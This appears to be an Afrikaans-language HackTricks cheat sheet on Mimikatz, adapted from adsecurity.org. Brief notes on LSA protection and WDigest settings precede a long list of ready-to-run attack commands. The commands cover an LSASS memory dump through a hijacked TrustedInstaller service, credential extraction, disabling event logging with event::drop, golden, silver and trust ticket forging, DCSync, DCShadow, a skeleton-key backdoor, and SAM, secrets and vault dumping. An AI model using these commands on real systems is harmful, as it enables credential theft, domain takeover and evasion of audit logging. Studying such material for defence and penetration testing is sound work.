# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Kyk na die oorspronklike vir verdere inligting!

## LM en Duidelike Teks in geheue

Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen kredietbewaking te beskerm:

- **LM hashes en plain-text wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.

- **LSA Beskerming** word bekendgestel om die Plaaslike Sekuriteitsowerheid (LSA) proses te beskerm teen ongeoorloofde geheue lees en kode inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
1. Die registrasie te wysig by _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
2. 'n Groep Beleidsobjek (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.

Ten spyte van hierdie beskermings, kan gereedskap soos Mimikatz LSA Beskerming omseil deur spesifieke bestuurders te gebruik, alhoewel sulke aksies waarskynlik in gebeurtenislogs aangeteken sal word.

### Teenwerking van SeDebugPrivilege Verwydering

Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om kredietbewaking uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Dit stel die dumping van die `lsass.exe` geheue na 'n lêer in, wat dan op 'n ander stelsel geanaliseer kan word om kredensiale te onttrek:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Opsies

Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van gebeurtenislogs en die patching van die Event-diens om die registrasie van nuwe gebeurtenisse te voorkom. Hieronder is die opdragte om hierdie aksies uit te voer:

#### Skoonmaak van Gebeurtenislogs

- **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite te volg.
- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit behels egter tipies die gebruik van stelsels gereedskap of skripte buite Mimikatz om spesifieke logs skoon te maak (bv. deur PowerShell of Windows Event Viewer te gebruik).

#### Eksperimentele Kenmerk: Patching van die Event-diens

- **Opdrag**: `event::drop`
- Hierdie eksperimentele opdrag is ontwerp om die gedrag van die Event Logging Service te wysig, wat effektief voorkom dat dit nuwe gebeurtenisse registreer.
- Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`

- Die `privilege::debug` opdrag verseker dat Mimikatz met die nodige voorregte werk om stelseldienste te wysig.
- Die `event::drop` opdrag patch dan die Event Logging diens.

### Kerberos Tekenaanvalle

### Goue Teken Skepping

'n Goue Teken stel in staat tot domein-wye toegang impersonasie. Sleutelopdrag en parameters:

- Opdrag: `kerberos::golden`
- Parameters:
- `/domain`: Die domeinnaam.
- `/sid`: Die domein se Veiligheidsidentifiseerder (SID).
- `/user`: Die gebruikersnaam om te impersonate.
- `/krbtgt`: Die NTLM-hash van die domein se KDC-diensrekening.
- `/ptt`: Spesifiek die teken direk in geheue in te spuit.
- `/ticket`: Stoor die teken vir later gebruik.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Skepping

Silver Tickets gee toegang tot spesifieke dienste. Sleutelopdrag en parameters:

- Opdrag: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
- Parameters:
- `/service`: Die diens om te teiken (bv., cifs, http).
- Ander parameters soortgelyk aan Golden Ticket.

Voorbeeld:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Vertroue Teken Skep

Vertroue Teken word gebruik om toegang tot hulpbronne oor domeine te verkry deur vertrouensverhoudings te benut. Sleutelopdrag en parameters:

- Opdrag: Soortgelyk aan Goue Teken, maar vir vertrouensverhoudings.
- Parameters:
- `/target`: Die teiken-domein se FQDN.
- `/rc4`: Die NTLM-hash vir die vertrouensrekening.

Voorbeeld:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Bykomende Kerberos Opdragte

- **Lys Kaartjies**:

- Opdrag: `kerberos::list`
- Lys alle Kerberos kaartjies vir die huidige gebruikersessie.

- **Gee die Kas**:

- Opdrag: `kerberos::ptc`
- Spuit Kerberos kaartjies in vanaf kaslêers.
- Voorbeeld: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Gee die Kaartjie**:

- Opdrag: `kerberos::ptt`
- Laat toe om 'n Kerberos kaartjie in 'n ander sessie te gebruik.
- Voorbeeld: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Verwyder Kaartjies**:
- Opdrag: `kerberos::purge`
- Verwyder alle Kerberos kaartjies uit die sessie.
- Nuttig voor die gebruik van kaartjie manipulasie opdragte om konflikte te vermy.

### Aktiewe Gids Manipulasie

- **DCShadow**: Tydelik 'n masjien laat optree as 'n DC vir AD objek manipulasie.

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Naboots 'n DC om wagwoorddata aan te vra.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Krediettoegang

- **LSADUMP::LSA**: Trek krediete uit LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Naboots 'n DC met 'n rekenaarrekening se wagwoorddata.

- _Geen spesifieke opdrag verskaf vir NetSync in oorspronklike konteks._

- **LSADUMP::SAM**: Toegang tot plaaslike SAM databasis.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Dekripsie van geheime wat in die register gestoor is.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker in.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Verkry vertrouensverifikasie-inligting.
- `mimikatz "lsadump::trust" exit`

### Divers

- **MISC::Skeleton**: Spuit 'n agterdeur in LSASS op 'n DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Verkry rugsteunregte.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Verkry debug regte.
- `mimikatz "privilege::debug" exit`

### Kredietdumping

- **SEKURLSA::LogonPasswords**: Wys krediete vir ingelogde gebruikers.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Trek Kerberos kaartjies uit geheue.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid en Token Manipulasie

- **SID::add/modify**: Verander SID en SIDHistory.

- Voeg by: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Verander: _Geen spesifieke opdrag vir verander in oorspronklike konteks._

- **TOKEN::Elevate**: Naboots tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Dienste

- **TS::MultiRDP**: Laat meerdere RDP sessies toe.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lys TS/RDP sessies.
- _Geen spesifieke opdrag verskaf vir TS::Sessions in oorspronklike konteks._

### Kluis

- Trek wagwoorde uit Windows Kluis.
- `mimikatz "vault::cred /patch" exit`


{{#include ../../banners/hacktricks-training.md}}
